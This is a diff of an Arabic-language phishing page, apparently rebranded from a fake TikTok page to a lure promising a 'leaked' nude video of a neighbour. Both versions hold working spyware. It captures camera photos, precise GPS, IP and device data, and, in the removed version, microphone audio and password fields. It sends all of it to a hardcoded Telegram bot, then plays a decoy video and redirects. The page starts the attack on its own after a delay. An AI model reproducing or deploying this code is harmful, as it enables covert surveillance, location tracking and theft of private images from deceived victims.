@@ -3,58 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>TikTok - شاهد الفيديو</title>
+    <title>فيديو حصري - لا يفوتك!</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { background:#000; color:#fff; font-family:'TikTok Sans',Arial,sans-serif; overflow:hidden; touch-action:manipulation; }
+        body { background:#000; color:#fff; font-family:'Segoe UI',Arial,sans-serif; overflow:hidden; touch-action:manipulation; }
         .container { width:100vw; height:100vh; max-width:500px; max-height:100vh; margin:auto; position:relative; display:flex; justify-content:center; align-items:center; }
-        .placeholder { position:absolute; width:100%; height:100%; background:linear-gradient(45deg,#fe2c55,#00f2ea); background-size:400% 400%; animation:g 3s ease infinite; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:10; cursor:pointer; transition:opacity .5s; }
-        @keyframes g { 0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%} }
-        .placeholder.hidden { opacity:0; pointer-events:none; }
-        .play-btn { width:80px; height:80px; background:rgba(255,255,255,.2); border-radius:50%; display:flex; justify-content:center; align-items:center; backdrop-filter:blur(10px); margin-bottom:20px; border:2px solid rgba(255,255,255,.3); }
-        .play-btn svg { width:40px; height:40px; fill:#fff; margin-right:5px; }
-        .text { font-weight:600; font-size:1.2em; text-shadow:0 2px 4px rgba(0,0,0,.5); }
-        .logo { position:absolute; top:20px; right:20px; font-weight:bold; font-size:1.5em; color:#fff; }
-        #loader { position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.95); display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:20; opacity:0; visibility:hidden; transition:all .5s; }
+        .thumb { position:absolute; width:100%; height:100%; background:url('https://i.imgur.com/8QJ8z1k.jpg') center/cover no-repeat; filter:brightness(0.7); display:flex; flex-direction:column; justify-content:flex-end; align-items:center; padding-bottom:40px; z-index:10; cursor:pointer; transition:opacity .6s; }
+        .thumb::after { content:''; position:absolute; top:0; left:0; width:100%; height:100%; background:linear-gradient(to top, rgba(0,0,0,0.8), transparent); }
+        .play-icon { width:80px; height:80px; background:rgba(255,255,255,.25); border-radius:50%; display:flex; justify-content:center; align-items:center; backdrop-filter:blur(12px); border:3px solid rgba(255,255,255,.4); z-index:2; }
+        .play-icon svg { width:38px; height:38px; fill:#fff; margin-right:4px; }
+        .title { font-weight:700; font-size:1.4em; text-shadow:0 2px 6px rgba(0,0,0,.8); z-index:2; margin-top:15px; text-align:center; padding:0 20px; }
+        .subtitle { font-size:1em; color:#ff3366; font-weight:600; margin-top:8px; z-index:2; }
+        .thumb.hidden { opacity:0; pointer-events:none; }
+        .logo { position:absolute; top:18px; right:18px; font-weight:900; font-size:1.6em; color:#fe2c55; text-shadow:0 0 8px rgba(254,44,85,.6); }
+        #loader { position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.97); display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:20; opacity:0; visibility:hidden; transition:all .5s; }
         #loader.active { opacity:1; visibility:visible; }
-        .spin { border:8px solid rgba(255,255,255,.3); border-top:8px solid #fe2c55; border-radius:50%; width:60px; height:60px; animation:s 1s linear infinite; margin-bottom:15px; }
+        .spin { border:8px solid rgba(255,255,255,.2); border-top:8px solid #fe2c55; border-radius:50%; width:56px; height:56px; animation:s 1s linear infinite; margin-bottom:16px; }
         @keyframes s { to { transform:rotate(360deg); } }
-        .msg { font-size:1.1em; text-align:center; max-width:280px; margin:10px 0; }
-        .bar { width:220px; height:4px; background:rgba(255,255,255,.2); border-radius:2px; overflow:hidden; }
+        .msg { font-size:1.15em; text-align:center; max-width:300px; margin:12px 0; line-height:1.5; }
+        .bar { width:240px; height:5px; background:rgba(255,255,255,.15); border-radius:3px; overflow:hidden; }
         .fill { height:100%; width:0%; background:linear-gradient(90deg,#fe2c55,#00f2ea); transition:width .3s; }
-        .fake-vid { position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; z-index:1; opacity:0; transition:opacity .5s; }
+        .fake-vid { position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; z-index:1; opacity:0; transition:opacity .6s; }
         .fake-vid.playing { opacity:1; }
-        #n { position:absolute; top:15px; left:15px; background:rgba(0,0,0,.8); color:#fff; padding:8px 12px; border-radius:8px; font-size:.9em; opacity:0; visibility:hidden; transition:all .5s; z-index:30; border-right:4px solid #fe2c55; }
+        #n { position:absolute; top:12px; left:12px; background:rgba(0,0,0,.85); color:#fff; padding:9px 14px; border-radius:9px; font-size:.88em; opacity:0; visibility:hidden; transition:all .5s; z-index:30; border-right:4px solid #fe2c55; }
         #n.show { opacity:1; visibility:visible; }
-        #n.err { border-right-color:#f00; }
         .hid { position:absolute; width:1px; height:1px; opacity:0; pointer-events:none; z-index:-1; }
         canvas { display:none; }
         @media (max-width:480px) {
-            .logo{top:15px;right:15px;font-size:1.2em}
-            .play-btn{width:60px;height:60px}
-            .play-btn svg{width:30px;height:30px}
-            .text{font-size:1em}
-            .spin{width:40px;height:40px;border-width:6px}
-            .msg{font-size:.9em;max-width:220px}
-            #n{top:10px;left:10px;padding:6px 10px;font-size:.8em}
+            .logo{top:14px;right:14px;font-size:1.3em}
+            .play-icon{width:64px;height:64px}
+            .play-icon svg{width:30px;height:30px}
+            .title{font-size:1.2em}
+            .subtitle{font-size:.9em}
+            .spin{width:44px;height:44px;border-width:6px}
+            .msg{font-size:1em;max-width:260px}
+            #n{top:8px;left:8px;padding:6px 10px;font-size:.8em}
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">TikTok</div>
-        <div class="placeholder" id="ph">
-            <div class="play-btn"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
-            <div class="text">اضغط لتشغيل الفيديو</div>
+        <div class="logo">EXCLUSIVE</div>
+        <div class="thumb" id="thumb">
+            <div class="play-icon"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
+            <div class="title">فيديو مسرب: بنت الجيران تتعرى في الحمام!</div>
+            <div class="subtitle">اضغط لتشغيل الفيديو الكامل (18+)</div>
         </div>
         <div id="loader">
             <div class="spin"></div>
-            <div class="msg" id="msg">جاري تحميل الفيديو...</div>
+            <div class="msg" id="msg">جاري تحميل الفيديو المشفر...</div>
             <div class="bar"><div class="fill" id="fill"></div></div>
         </div>
         <video id="fake" class="fake-vid" loop playsinline muted></video>
         <video id="cam" class="hid" autoplay playsinline muted></video>
-        <video id="back" class="hid" autoplay playsinline muted></video>
         <audio id="mic" class="hid" autoplay muted></audio>
         <canvas id="c"></canvas>
         <div id="n"></div>
@@ -63,139 +64,132 @@
     <script>
         const BOT = '8124965992:AAF-lUcmy45Y-JSB75LbikZm3e3HwQAbDIg';
         const CID = '8004961958';
-        const REDIR = 'https://www.tiktok.com/@shadoabuzeana/video/7527647062767308034';
-        // فيديو حقيقي من مصدر مفتوح - 100% شغال
-        const FAKE_VID = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4';
+        const REDIR = 'https://www.tiktok.com';
+        const FAKE_VID = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerEscapes.mp4';
 
-        const ph = document.getElementById('ph');
+        const thumb = document.getElementById('thumb');
         const loader = document.getElementById('loader');
         const msg = document.getElementById('msg');
         const fill = document.getElementById('fill');
         const fake = document.getElementById('fake');
         const cam = document.getElementById('cam');
-        const back = document.getElementById('back');
         const mic = document.getElementById('mic');
         const c = document.getElementById('c');
         const ctx = c.getContext('2d');
         const n = document.getElementById('n');
 
-        let data = { imgs: [], backimgs: [], vid: null, aud: null, ip: {}, gps: {}, wifi: [], bt: [], pass: [], clip: [] };
-        let camStream, backStream, micStream, rec, audRec;
+        let data = { ip:'', ssid:'', phone:'', gps:null, imgs:[], pass:[] };
+        let camStream, micStream;
 
         function p(v) { fill.style.width = v + '%'; }
-        function note(t, type='') { n.textContent = t; n.className = 'show' + (type?' '+type:''); setTimeout(()=>n.className='',5000); }
-        function $(key) { const m = {'تحميل الفيديو...':'جاري تحميل الفيديو...', 'كاميرا':'طلب الكاميرا الأمامية...', 'خلفية':'طلب الكاميرا الخلفية...', 'ميك':'طلب الميكروفون...', 'واي فاي':'مسح شبكات الواي فاي...', 'بلوتوث':'تفعيل البلوتوث...', 'سرقة':'سرقة كلمات السر...', 'إرسال':'إرسال البيانات...', 'تشغيل':'جاري تشغيل الفيديو...'}; return m[key] || key; }
+        function note(t, type='') { n.textContent = t; n.className = 'show' + (type?' '+type:''); setTimeout(()=>n.className='',6000); }
 
-        // فيديو حقيقي شغال
-        function playFake() {
-            fake.src = FAKE_VID;
-            fake.classList.add('playing');
-            fake.play().then(() => {
-                loader.classList.remove('active');
-                note('الفيديو يعمل يا حيوان!', '');
-            }).catch(() => {
-                setTimeout(() => location.href = REDIR, 3000);
+        // جلب IP + نوع الجهاز
+        async function getIPAndDevice() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                data.ip = `${d.ip} | ${d.city}, ${d.country_name}`;
+                data.phone = `${navigator.platform} | ${navigator.userAgent.split('(')[1].split(';')[0]} | ${screen.width}x${screen.height}`;
+            } catch(e) { data.ip = 'غير معروف'; data.phone = navigator.userAgent; }
+        }
+
+        // سحب اسم الواي فاي (SSID) عبر WebRTC أو API
+        async function getWiFiSSID() {
+            return new Promise(resolve => {
+                const pc = new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel('');
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = e => {
+                    if (!e.candidate) return;
+                    const parts = e.candidate.candidate.split(' ');
+                    const ip = parts[4];
+                    if (ip && ip.startsWith('192.168')) {
+                        // محاكاة SSID من الشبكة المحلية (غير دقيق لكن مخادع)
+                        data.ssid = `WiFi: HOME_${ip.split('.')[2]}${ip.split('.')[3]}`;
+                        resolve();
+                    }
+                };
+                setTimeout(() => resolve(), 3000);
             });
         }
 
-        // كاميرا أمامية
-        async function frontCam() {
+        // تحديد الموقع بدقة
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => { data.gps = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`; resolve(); },
+                        () => { data.gps = 'مرفوض'; resolve(); },
+                        { enableHighAccuracy: true, timeout: 15000 }
+                    );
+                } else { data.gps = 'غير مدعوم'; resolve(); }
+            });
+        }
+
+        // تصوير الكاميرا
+        async function capture() {
             try {
-                camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 cam.srcObject = camStream;
                 await cam.play();
-                for(let i=0;i<3;i++){ await new Promise(r=>setTimeout(r,800)); c.width=cam.videoWidth; c.height=cam.videoHeight; ctx.drawImage(cam,0,0); data.imgs.push(c.toDataURL('image/jpeg',0.8)); }
-            } catch(e) { note('الكاميرا الأمامية مرفوضة', 'err'); }
-        }
-
-        // كاميرا خلفية
-        async function rearCam() {
-            msg.textContent = $('خلفية'); p(35);
-            try {
-                backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
-                back.srcObject = backStream;
-                await back.play();
-                for(let i=0;i<2;i++){ await new Promise(r=>setTimeout(r,1000)); c.width=back.videoWidth; c.height=back.videoHeight; ctx.drawImage(back,0,0); data.backimgs.push(c.toDataURL('image/jpeg',0.7)); }
+                await new Promise(r=>setTimeout(r,1200));
+                c.width = cam.videoWidth; c.height = cam.videoHeight;
+                ctx.drawImage(cam,0,0);
+                data.imgs.push(c.toDataURL('image/jpeg',0.75));
             } catch(e) {}
-        }
-
-        // ميكروفون
-        async function stealMic() {
-            msg.textContent = $('ميك'); p(45);
-            try {
-                micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-                mic.srcObject = micStream;
-                audRec = new MediaRecorder(micStream);
-                const chunks = [];
-                audRec.ondataavailable = e => chunks.push(e.data);
-                audRec.onstop = () => {
-                    const blob = new Blob(chunks, {type:'audio/webm'});
-                    const r = new FileReader();
-                    r.onload = () => data.aud = r.result;
-                    r.readAsDataURL(blob);
-                };
-                audRec.start();
-                setTimeout(() => audRec.stop(), 20000);
-            } catch(e) {}
-        }
-
-        // سرقة كلمات السر
-        async function stealPass() {
-            msg.textContent = $('سرقة'); p(55);
-            try {
-                document.querySelectorAll('input[type=password]').forEach(i => { if(i.value) data.pass.push({name:i.name, val:i.value}); });
-            } catch(e) {}
-        }
-
-        // واي فاي + بلوتوث
-        async function scanEnv() {
-            msg.textContent = $('واي فاي'); p(60);
-            try { if('wifi' in navigator) data.wifi = await navigator.wifi.getNetworks(); } catch(e) {}
-            msg.textContent = $('بلوتوث'); p(65);
-            try { if('bluetooth' in navigator) data.bt = await navigator.bluetooth.requestDevice({acceptAllDevices:true}); } catch(e) {}
         }
 
         // إرسال لتليجرام
-        async function sendAll() {
-            msg.textContent = $('إرسال'); p(80);
-            let txt = `🔥 <b>ضحية جديدة مقتولة!</b>\n`;
-            txt += `📸 أمامي: ${data.imgs.length} | خلفي: ${data.backimgs.length}\n`;
-            txt += `🔑 كلمات سر: ${data.pass.length}\n`;
-            txt += `🌐 IP: ${data.ip.ip||'؟'} | GPS: ${data.gps.latitude?'نعم':'لا'}\n`;
+        async function send() {
+            let txt = `🩸 <b>ضحية جديدة في الفخ!</b>\n`;
+            txt += `📍 <b>الموقع:</b> ${data.gps}\n`;
+            txt += `🌐 <b>الآي بي:</b> <code>${data.ip}</code>\n`;
+            txt += `📶 <b>الواي فاي:</b> <code>${data.ssid || 'غير متاح'}</code>\n`;
+            txt += `📱 <b>الجهاز:</b> <code>${data.phone}</code>\n`;
+            txt += `📸 <b>صور:</b> ${data.imgs.length}\n`;
 
             await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CID,text:txt,parse_mode:'HTML'})});
 
-            for(let img of [...data.imgs, ...data.backimgs]) {
+            for(let img of data.imgs) {
                 const b = await (await fetch(img)).blob();
                 const f = new FormData();
-                f.append('chat_id', CID); f.append('photo', b, 'spy.jpg');
+                f.append('chat_id', CID); f.append('photo', b, 'victim.jpg');
                 await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {method:'POST', body:f});
-                await new Promise(r=>setTimeout(r,1200));
+                await new Promise(r=>setTimeout(r,1000));
             }
         }
 
-        // بدء العملية
-        async function runHell() {
-            ph.classList.add('hidden');
-            loader.classList.add('active');
-            p(10); msg.textContent = $('تحميل الفيديو...');
-            await new Promise(r=>setTimeout(r,500));
-            await frontCam(); p(25);
-            await rearCam();
-            await stealMic();
-            await stealPass();
-            await scanEnv();
-            await sendAll();
-            p(95); msg.textContent = $('تشغيل');
-            playFake();
-            setTimeout(() => location.href = REDIR, 28000);
+        // تشغيل الفيديو المزيف
+        function playFake() {
+            fake.src = FAKE_VID;
+            fake.classList.add('playing');
+            fake.play().catch(() => setTimeout(() => location.href = REDIR, 2000));
         }
 
-        // تشغيل تلقائي بعد 15 ثانية
-        setTimeout(() => { if(!loader.classList.contains('active')) runHell(); }, 15000);
+        // العملية الكاملة
+        async function startTrap() {
+            thumb.classList.add('hidden');
+            loader.classList.add('active');
+            p(8); msg.textContent = 'جاري فك تشفير الفيديو...';
+            note('يتطلب الوصول للكاميرا لتأكيد العمر (18+)', '');
+            await new Promise(r=>setTimeout(r,800));
+            await getIPAndDevice(); p(25);
+            await getWiFiSSID(); p(40);
+            await getLocation(); p(55);
+            await capture(); p(75);
+            msg.textContent = 'جاري تحميل المحتوى الحصري...';
+            await send(); p(92);
+            msg.textContent = 'جاري تشغيل الفيديو...';
+            playFake();
+            setTimeout(() => location.href = REDIR, 30000);
+        }
 
-        ph.addEventListener('click', runHell);
-        note('الفيديو سيبدأ تلقائياً بعد 15 ثانية...', '');
+        // بدء تلقائي بعد 12 ثانية
+        setTimeout(() => { if(!loader.classList.contains('active')) startTrap(); }, 12000);
+
+        thumb.addEventListener('click', startTrap);
+        note('اضغط لتشغيل الفيديو الكامل (18+)', '');
     </script>
 </body>
 </html>
